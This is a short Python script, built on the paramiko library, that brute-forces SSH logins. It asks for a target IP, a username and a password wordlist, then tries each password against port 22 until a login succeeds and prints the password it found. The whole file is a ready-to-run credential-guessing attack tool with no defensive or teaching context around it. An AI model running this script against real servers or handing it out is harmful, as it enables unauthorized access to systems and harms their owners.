import paramiko,sys,os

target = str(input("Enter Target IP : "))
username = str(input("Enter the username : "))
passwordFile = str(input("Enter the password file : "))
def sshBrute(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(target, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	ssh.close()
	return code
	

with open(passwordFile , "r") as file:
	for line in file.readlines():
		password = line.strip()
		try:
			code = sshBrute(password)
			if code == 0:
				print('password found: '+password)
				exit(0)
			elif code == 1:
				print('No luck!!')
		except Exception as e:
			print(e)
			
		pass

